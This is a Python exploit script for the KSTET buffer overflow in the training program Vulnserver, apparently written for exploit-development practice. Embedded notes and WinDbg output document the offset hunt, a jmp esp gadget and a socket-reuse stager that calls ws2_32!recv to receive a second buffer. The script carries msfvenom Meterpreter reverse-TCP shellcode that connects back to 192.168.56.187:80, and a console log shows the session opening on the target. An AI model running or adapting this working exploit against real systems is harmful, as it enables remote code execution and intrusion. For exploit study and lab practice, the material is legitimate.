#!/usr/bin/env python3
import os, sys, re, socket, binascii, time
from struct import pack, unpack
from IPython import embed

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv; g'

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 0040191D; g'



NOTES=r"""
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./poc.py 192.168.56.100:9999
Welcome to Vulnerable Server! Enter HELP for help.

Valid Commands:
HELP
STATS [stat_value]      ; not_exploitable
RTIME [rtime_value]     ; not_exploitable
LTIME [ltime_value]     ; not_exploitable
SRUN [srun_value]       ; not_exploitable
TRUN [trun_value]       ; exploitable
GMON [gmon_value]       ; exploitable
GDOG [gdog_value]       ; not_exploitable
KSTET [kstet_value]     ; exploitable
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT

KSTET has an malloc for 0x64 bytes.
This is followed by a _strncpy for 0x64 bytes:

.text:0040202F mov     dword ptr [esp+8], 64h ; 'd' ; Count
.text:00402037 mov     eax, [ebp+buf]
.text:0040203A mov     [esp+4], eax    ; Source
.text:0040203E mov     eax, [ebp+var_50]
.text:00402041 mov     [esp], eax      ; Destination
.text:00402044 call    _strncpy

Then, there is a memset for 0x1000 bytes to 0x0.  Unfortunately, this occurs on the received buffer.
.text:00402049 mov     dword ptr [esp+8], 1000h ; Size
.text:00402051 mov     dword ptr [esp+4], 0 ; Val
.text:00402059 mov     eax, [ebp+buf]
.text:0040205C mov     [esp], eax      ; void *
.text:0040205F call    _memset

This is followed by moving the pointer to the _strncpy of 0x64 bytes from the now-zeroed buffer to arg0 and calling _Function2.
.text:00402064 mov     eax, [ebp+var_50]
.text:00402067 mov     [esp], eax      ; Source
.text:0040206A call    _Function2

0:003> dc poi(esp)
00b74f70  4554534b 41412054 41414141 41414141  KSTET AAAAAAAAAA
00b74f80  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00b74f90  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00b74fa0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00b74fb0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00b74fc0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00b74fd0  41414141 00000000 00000000 00000000  AAAA............


This is also very near right up against the end of the heap:
0:003> db poi(esp) L0xff
(00b74f70)  4b 53 54 45 54 20 41 41-41 41 41 41 41 41 41 41  KSTET AAAAAAAAAA
00b74f80  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00b74f90  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00b74fa0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00b74fb0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00b74fc0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00b74fd0  41 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00  AAAA............
00b74fe0  ae 77 d7 68 25 49 00 03-8c 00 b7 00 8c 00 b7 00  .w.h%I..........
00b74ff0  38 00 b7 00 38 00 b7 00-00 50 b7 00 00 a0 00 00  8...8....P......
00b75000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00b75010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
0:003> !address 00b74f70
Usage:                  Heap
Base Address:           00b70000
End Address:            00b75000


esp before going into call _function2:
0:003> dc esp
00f7fa08  00b74f70 00000000 00001000

At the following instruction in _function2:
.text:00401913 mov     [esp], eax      ; Destination

0:003> !address eax
Usage:                  Stack
Base Address:           00f7f000
End Address:            00f80000

Destination is on the stack.

After executing the _strcpy:
0:003> k
 # ChildEBP RetAddr      
WARNING: Stack unwind information not available. Following frames may be wrong.
00 00f7fa00 41414141     vulnserver+0x191c
01 00f7fa7c 77156eac     0x41414141
02 00f7fb10 00f7faf8     ntdll!RtlpAllocateHeapInternal+0x104c
03 00000000 00000000     0xf7faf8

Obviously, returning out of _Function2 is going to crash.  But not sure what can be done with a meager 0x64 bytes.

ESP at the ret instruction:
0:003> dd esp
00f7fa04  41414141 41414141 41414141 41414141
00f7fa14  41414141 41414141 41414141 00000000
00f7fa24  00000001 01000138 000001fc 000fffb0

After updating the buffer with a pattern string, esp at the ret:
0099fa04 (41326341) 63413363 35634134 41366341
0099fa14 63413763 39634138 41306441 00000000

┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ msf-pattern_offset -l 0x1000 -q 41326341
[*] Exact match at offset 66

For crash-time return address, We can use the jmp esp instruction from a previous search for gadgets:
rp++-ng -f essfunc.dll --va 0x62500000 -lusr8 -b "\x00"
0x625012f0: jmp esp ;


After updating EIP and resending, and after executing the jmp esp, here is EIP:
00edfa08 42424242 42424242 42424242 42424242
00edfa18 42424242 42424242 00000000 00000001

There are 0x18 bytes to work with in stage1.  That's 40 bytes. EAX points to the beginning of "KSTET ", so an add al, 0x6 will adjust to the beginning of the As.  We can then jump there for a stage2.

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "add al, 0x6; jmp eax"

    #[.]  add al, 0x6\n jmp eax
    # 00000000  0406              add al,0x6
    # 00000002  FFE0              jmp eax
    # 4 bytes

    "\x04\x06\xff\xe0"      # 0406 add al,0x6; FFE0 jmp eax # 4 bytes

That's only four bytes, which leaves 0x14 in stage1 unaccounted for.  Might as well use the space to do something first, before adjusting eax and jumping there.

Within stage1, I noticed there is a ws2_32!recv address not far from esp:
0:003> dds esp-0x58 L0x1
00edf9b0  75ad24a0 WS2_32!recv+0x100

The following will acquire the absolute address of ws2_32!recv into edi:

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "mov edi, dword [esp-0x58]; mov dx, 0x101; sub edi, edx; inc edi"

    #[.]  mov edi, dword [esp-0x58]\n mov dx, 0x101\n sub edi, edx\n inc edi
    # 00000000  8B7C24A8          mov edi,[esp-0x58]
    # 00000004  66BA0101          mov dx,0x101
    # 00000008  29D7              sub edi,edx
    # 0000000A  47                inc edi
    # 11 bytes

    "\x8b\x7c\x24\xa8\x66\xba\x01\x01\x29\xd7\x47"  # 8B7C24A8 mov edi,[esp-0x58]; 66BA0101 mov dx,0x101; 29D7 sub edi,edx; 47 inc edi # 11 bytes

Let's start with that.  I'll update stage1, and step through to verify.
Confirmed!
0:003> u edi
WS2_32!recv:
75ad23a0 8bff            mov     edi,edi
75ad23a2 55              push    ebp
75ad23a3 8bec            mov     ebp,esp
75ad23a5 83ec1c          sub     esp,1Ch
75ad23a8 53              push    ebx
75ad23a9 56              push    esi
75ad23aa 8b350080b075    mov     esi,dword ptr [WS2_32!PrologPointer (75b08000)]
75ad23b0 57              push    edi

EIP now has only 0xc bytes available to work with... if I can do something with the 8 bytes not already spoken-for, that would be great.

The function prototype of ws2_32!recv:
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);

I set a breakpoint on ws2_32!recv.  When the breakpoint is hit, ESP:
0:003> dds esp l0x10
00dffa04  00401a51 vulnserver+0x1a51
00dffa08  00000098
00dffa0c  00653b60
00dffa10  00001000
00dffa14  00000000

That means the values translate to the following:
0:003> dds esp l0x10
00dffa04  00401a51 vulnserver+0x1a51
00dffa08  00000098 ; SOCKET s
00dffa0c  00653b60 ; char *buf
00dffa10  00001000 ; int len
00dffa14  00000000 ; int flags

This shouldn't be too hard to duplicate.  Just need to figure out if I can acquire the socket.
0:003> !address 00dffa08
[...]
Usage:                  Stack
Base Address:           00dff000
End Address:            00e00000


This is good.  I wonder what the offset from esp is at the time of after acquiring ws2_32!recv va.  I'll continue execution to breakpoint1, which is the ret instruction in _Function2.  I'll then single-step through until EDI is pointing at ws2_32!recv va.

Actually, by the time I was ready to continue, the socket had already closed.  So I'll need to be creative with breakpoints and list the memory before continuing on to breakpoint1.

((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv "dds esp L0x5; gc"; bp 0040191D; g'

That doesn't work either.  Manually breaking ws2_32!recv and stepping out, eax=ffffffff, so it must have failed because of the break.  Instead, I'll break on the address the function returns to, 00401a51 .

((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 00401a51 "dds esp L0x5; gc"; bp 0040191D; g'

Unfortunately, although this worked, the memory seems to be overwritten by the new buffer of 0x64 bytes.

Well, at the call to recv, it shows the socket comes from ebp+s:

.text:00401A30
.text:00401A30 loc_401A30:             ; flags
.text:00401A30 mov     dword ptr [esp+0Ch], 0
.text:00401A38 mov     eax, [ebp+len]
.text:00401A3B mov     [esp+8], eax    ; len
.text:00401A3F mov     eax, [ebp+buf]
.text:00401A42 mov     [esp+4], eax    ; buf
.text:00401A46 mov     eax, [ebp+s]                 <----
.text:00401A49 mov     [esp], eax      ; s
.text:00401A4C call    _recv@16        ; recv(x,x,x,x)
.text:00401A51 sub     esp, 10h
.text:00401A54 mov     [ebp+var_38], eax
.text:00401A57 cmp     [ebp+var_38], 0
.text:00401A5B jle     loc_4024D9

The function locals set s to -0x34:
.text:00401960 s= dword ptr -34h

With the following, I can break after the recv call, and inspect what memory region ebp is pointing to, and where s comes from.
((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 00401a51; bp 0040191D; g'

EBP after recv:
0:001> !address ebp

Usage:                  Stack
Base Address:           009df000
End Address:            009e0000

That's promising.
0:001> dds ebp-0x34 L0x3
009dff3c  00000108          <----
009dff40  00674b68
009dff44  00673b60

So now I'll continue as planned to when EDI holds ws2_32!recv va, and see if there's a rational offset from esp, and whether this is overwritten or not.

There is.  ESP at EDI=ws2_32!recv
0:001> dd esp
009dfa08  a8247c8b 0101ba66 4247d729 42424242
009dfa18  42424242 42424242 00000000 00000001

0:001> ? 009dff3c - 009dfa08
Evaluate expression: 1332 = 00000534
0:001> dds esp+0x534 L0x1
009dff3c  00000108

The following will acquire SOCKET s into edx, and it happens to be 8 bytes!
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "mov dx, 0x534; add edx, esp; mov edx, [edx]"

    #[.]  mov dx, 0x534\n add edx, esp\n mov edx, [edx]
    # 00000000  66BA3405          mov dx,0x534
    # 00000004  01E2              add edx,esp
    # 00000006  8B12              mov edx,[edx]
    # 8 bytes

    "\x66\xba\x34\x05\x01\xe2\x8b\x12"      # 66BA3405 mov dx,0x534; 01E2 add edx,esp; 8B12 mov edx,[edx] # 8 bytes

I end up with a stage1 like:
    stage1 = (
        ## acquire ws2_32!recv va into edi
        "\x8b\x7c\x24\xa8\x66\xba\x01\x01\x29\xd7\x47"  # 8B7C24A8 mov edi,[esp-0x58]; 66BA0101 mov dx,0x101; 29D7 sub edi,edx; 47 inc edi # 11 bytes

        ## Acquire SOCKET s into edx
        "\x66\xba\x34\x05\x01\xe2\x8b\x12"      # 66BA3405 mov dx,0x534; 01E2 add edx,esp; 8B12 mov edx,[edx] # 8 bytes

        ## realign eax to beginning of buffer and jump there
        "\x04\x06\xff\xe0"      # 0406 add al,0x6; FFE0 jmp eax # 4 bytes
    )


After the jmp eax,
0:003> dd eax-0x6
00dcf9bc  4554534b 41412054 41414141 41414141
00dcf9cc  41414141 41414141 41414141 41414141
00dcf9dc  41414141 41414141 41414141 41414141

And:
0:003> r edi
edi=75ad23a0
0:003> r edx
edx=00000114
0:003> u edi L0x1
WS2_32!recv:
75ad23a0 8bff            mov     edi,edi

Next, I'll need a desintation address to recv into.

The following will set ebx for size 0x820, move esp into ecx and sub ebx from it, then move it back into esp (for retaddr and *shellcode), and zero ESI for flags.  

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "mov bx, 0x820; mov ecx, esp; sub ecx, ebx; mov esp, ecx; xor esi, esi"

    #[.]  mov bx, 0x820\n mov ecx, esp\n sub ecx, ebx\n mov esp, ecx\n xor esi, esi
    # 00000000  66BB2008          mov bx,0x820
    # 00000004  89E1              mov ecx,esp
    # 00000006  29D9              sub ecx,ebx
    # 00000008  89CC              mov esp,ecx
    # 0000000A  31F6              xor esi,esi
    # 12 bytes

    "\x66\xbb\x20\x08\x89\xe1\x29\xd9\x89\xcc\x31\xf6"      # 66BB2008 mov bx,0x820; 89E1 mov ecx,esp; 29D9 sub ecx,ebx; 89CC mov esp,ecx; 31F6 xor esi,esi # 12 bytes

After executing all these instructions, here are registers:
0:003> 
eax=0101f9c2 ebx=00000820 ecx=0101f1e8 edx=00000108 esi=00000000 edi=75ad23a0

recv prototype for reference:
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);

The following will set up the skel on the stack:
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "push esi; push ebx; push ecx; push edx; push ecx; push edi"

    #[.]  push esi\n push ebx\n push ecx\n push edx\n push ecx\n push edi
    # 00000000  56                push esi ; flags
    # 00000001  53                push ebx ; len
    # 00000002  51                push ecx ; *buf
    # 00000003  52                push edx ; SOCKET s
    # 00000004  51                push ecx ; * buf retaddr
    # 00000005  57                push edi ; ws2_32!recv va
    # 6 bytes

    "\x56\x53\x51\x52\x51\x57"      # 56 push esi; 53 push ebx; 51 push ecx; 52 push edx; 51 push ecx; 57 push edi # 6 bytes

After executing these instructions, ESP:
0:003> dds esp L0x6
00fdf1d0  75ad23a0 WS2_32!recv
00fdf1d4  00fdf1e8
00fdf1d8  0000010c
00fdf1dc  00fdf1e8
00fdf1e0  00000820
00fdf1e4  00000000

A final ret instruction ought to kick things into drive.
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "ret"

    #[.]  ret
    # 00000000  C3                ret
    # 1 bytes

    "\xc3"  # C3 ret # 1 bytes

What is left to do now woult be to do a second send, I'll remove all breakpoints and send a second buffer of four \xcc to try to trigger a break, as there's no real good way to break without breaking recv.

The following should work:
    buf = f"{opcode}{stage2}{slack1}{EIP}{stage1}{slack2}"
    
    buf2 ="\xcc\xcc\xcc\xcc"
    buf2 += "\x44" * (0x820-len(buf2))

    sock = sender(ip, port, buf)
    time.sleep(1)
    sock = sender_sockreuse(sock,buf2)

Upon breaking:
77184df0 cc              int     3
0:003> g
(15a0.1398): Break instruction exception - code 80000003 (first chance)
eax=00000820 ebx=00000820 ecx=00000002 edx=00000000 esi=00000000 edi=75ad23a0
eip=00eef1e8 esp=00eef1e8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
00eef1e8 cc              int     3

And EIP:
0:003> dds eip L0x8
00eef1e8  cccccccc
00eef1ec  44444444
00eef1f0  44444444
00eef1f4  44444444
00eef1f8  44444444
00eef1fc  44444444
00eef200  44444444
00eef204  44444444

Nice!  It works!

Only thing left to do now would be to add a nopsled and shellcode to buf2, and profit.

After updating for a nopsled and shellcode, resend the PoC and, it shells!

┌──(notroot㉿Business-End)-[~/WUMED/practical/0003__Shellcodes]
└─$ sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; set EXITFUNC process; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.56.187
LPORT => 80
EXITFUNC => process
[*] Started reverse TCP handler on 192.168.56.187:80 
[*] Sending stage (175686 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (192.168.56.187:80 -> 192.168.56.100:49976) at 2023-05-24 02:49:18 -0700

meterpreter > getuid
Server username: DESKTOP-4NR4332\Admin
meterpreter > sysinfo
Computer        : DESKTOP-4NR4332
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

"""




def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')

# def unpacklatin(fmt, inp):
#         return unpack(fmt, inp.encode('latin-1'))[0]

# def uniesc_to_bytestr(instring):
#     r""" '\\x58\\x59\\x5a\\xa0' -> 'XYZ\xa0' 
#         hexstrings in from cli, ex., argparse   """
#     return bytes(instring, 'utf-8').decode("unicode_escape")

# def bytestr_to_long(inbstr):
#     r""" 'XYZ\xa0' -> 2690275672 """
#     return unpack("I",bytes(inbstr,'latin-1'))[0]

# def long_to_bytestr(inlong):
#     r""" 2690275672 -> 'XYZ\xa0' """
#     return pack("<L", inlong).decode('latin-1')

# def octalstring_to_bytestr_pad(inoct):
#     r""" "0x200" -> '\x00\x02\x00\x00' (le) 
#         for the --va + --addbase scenario 
#         pad with \x00 to dword size bytes """
#     return pack("<L", (int(inoct,16))).decode('latin-1')

# def octalstring_to_bytestr_nopad(inoct):
#     r""" "0x200" -> '\x00\x02' (le) 
#         for the --va only scenario 
#         no padding with \x00 to dword size bytes """
#     octstr = inoct[2:]
#     if len(octstr) % 2 == 1:
#         octstr = f"0{octstr}"
#     return ''.join([chr(int(octstr[x:x+2],16)) for x in range(0,len(octstr),2)][::-1])

badchars = "\x00"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def sender(ip, port, buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(buf.encode('latin-1'))
    return sock

def sender_sockreuse(sock,buf):
    sock.send(buf.encode('latin-1'))
    return sock

def help(ip,port):
    buf = "HELP" 
    sock = sender(ip, port, buf)
    # print(sock.recv(4096))
    print(sock.recv(4096).decode('latin-1'))
    print(sock.recv(4096).decode('latin-1'))
    sock.close()

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    # help(ip,port)

    oflow_sz = 0x64
    crash_offset = 66
    opcode = "KSTET "
    stage2 = (
        ## size into ebx, *shellcode and retaddr (recv dest) into ecx and esp, and zero esi for flags.
        "\x66\xbb\x20\x08\x89\xe1\x29\xd9\x89\xcc\x31\xf6"      # 66BB2008 mov bx,0x820; 89E1 mov ecx,esp; 29D9 sub ecx,ebx; 89CC mov esp,ecx; 31F6 xor esi,esi # 12 bytes

        ### Skelwork
        "\x56\x53\x51\x52\x51\x57"      # 56 push esi; 53 push ebx; 51 push ecx; 52 push edx; 51 push ecx; 57 push edi # 6 bytes

        ### ret to ws2_32!recv
        "\xc3"  # C3 ret # 1 bytes
    )
    
    slack1 = "\x41" * (crash_offset - sum(iter([len(x) for x in [
        stage2
    ]])))
    EIP = packlatin("<L",0x625012f0) ## 0x625012f0: jmp esp
    stage1 = (
        ## acquire ws2_32!recv va into edi
        "\x8b\x7c\x24\xa8\x66\xba\x01\x01\x29\xd7\x47"  # 8B7C24A8 mov edi,[esp-0x58]; 66BA0101 mov dx,0x101; 29D7 sub edi,edx; 47 inc edi # 11 bytes

        ## Acquire SOCKET s into edx
        "\x66\xba\x34\x05\x01\xe2\x8b\x12"      # 66BA3405 mov dx,0x534; 01E2 add edx,esp; 8B12 mov edx,[edx] # 8 bytes

        ## realign eax to beginning of buffer and jump there
        "\x04\x06\xff\xe0"      # 0406 add al,0x6; FFE0 jmp eax # 4 bytes
    )
    slack2 = "\x42" * (oflow_sz - sum(iter([len(x) for x in [
        slack1,
        EIP,
        stage1
    ]])))
    buf = f"{opcode}{stage2}{slack1}{EIP}{stage1}{slack2}"
    

    ## STAGE 3
    stage3_size = 0x820
    nopsled = "\x90" * 0x20
    shellcode = (
        ## msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.187 LPORT=80 EXITFUNC=process -b "\x00" -e x86/xor_dynamic -f c
        ## sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; set EXITFUNC process; run"

        "\xeb\x23\x5b\x89\xdf\xb0\xc8\xfc\xae\x75\xfd\x89\xf9\x89"
        "\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xb3\xfc\x74\x08\x46"
        "\x80\x3e\xc8\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff"
        "\x05\xc8\xf9\xed\x8a\x05\x05\x05\x65\x34\xd7\x61\x8e\x57"
        "\x35\x8c\xe0\x8e\x57\x09\x8e\x57\x11\x0a\xb2\x4f\x23\x34"
        "\xfa\x8e\x77\x2d\x34\xc5\xa9\x39\x64\x79\x07\x29\x25\xc4"
        "\xca\x08\x04\xc2\x4c\x70\xea\x57\x8e\x57\x15\x8e\x47\x39"
        "\x04\xd5\x52\x8e\x45\x7d\x80\xc5\x71\x49\x04\xd5\x8e\x5d"
        "\x25\x8e\x4d\x1d\x55\x04\xd6\x80\xcc\x71\x39\x4c\x34\xfa"
        "\x8e\x31\x8e\x04\xd3\x34\xc5\xa9\xc4\xca\x08\x04\xc2\x3d"
        "\xe5\x70\xf1\x06\x78\xfd\x3e\x78\x21\x70\xe5\x5d\x8e\x5d"
        "\x21\x04\xd6\x63\x8e\x09\x4e\x8e\x5d\x19\x04\xd6\x8e\x01"
        "\x8e\x04\xd5\x8c\x41\x21\x21\x5e\x5e\x64\x5c\x5f\x54\xfa"
        "\xe5\x5d\x5a\x5f\x8e\x17\xec\x85\xfa\xfa\xfa\x58\x6d\x36"
        "\x37\x05\x05\x6d\x72\x76\x37\x5a\x51\x6d\x49\x72\x23\x02"
        "\x8c\xed\xfa\xd5\xbd\x95\x04\x05\x05\x2c\xc1\x51\x55\x6d"
        "\x2c\x85\x6e\x05\xfa\xd0\x6f\x0f\x6d\xc5\xad\x3d\xbe\x6d"
        "\x07\x05\x05\x55\x8c\xe3\x55\x55\x55\x55\x45\x55\x45\x55"
        "\x6d\xef\x0a\xda\xe5\xfa\xd0\x92\x6f\x15\x53\x52\x6d\x9c"
        "\xa0\x71\x64\xfa\xd0\x80\xc5\x71\x0f\xfa\x4b\x0d\x70\xe9"
        "\xed\x62\x05\x05\x05\x6f\x05\x6f\x01\x53\x52\x6d\x07\xdc"
        "\xcd\x5a\xfa\xd0\x86\xfd\x05\x7b\x33\x8e\x33\x6f\x45\x6d"
        "\x05\x15\x05\x05\x53\x6f\x05\x6d\x5d\xa1\x56\xe0\xfa\xd0"
        "\x96\x56\x6f\x05\x53\x56\x52\x6d\x07\xdc\xcd\x5a\xfa\xd0"
        "\x86\xfd\x05\x78\x2d\x5d\x6d\x05\x45\x05\x05\x6f\x05\x55"
        "\x6d\x0e\x2a\x0a\x35\xfa\xd0\x52\x6d\x70\x6b\x48\x64\xfa"
        "\xd0\x5b\x5b\xfa\x09\x21\x0a\x80\x75\xfa\xfa\xfa\xec\x9e"
        "\xfa\xfa\xfa\x04\xc6\x2c\xc3\x70\xc4\xc6\xbe\xf5\xb0\xa7"
        "\x53\x6f\x05\x56\xfa\xd0\xb3\xfc" # 400
    )
    nopsled2 = "\x90" * (stage3_size - sum(iter([len(x) for x in [
        nopsled,
        shellcode
    ]])))

    buf2 = f"{nopsled}{shellcode}{nopsled2}"

    sock = sender(ip, port, buf)
    time.sleep(1)
    sock = sender_sockreuse(sock,buf2)


if __name__=="__main__":
    main()

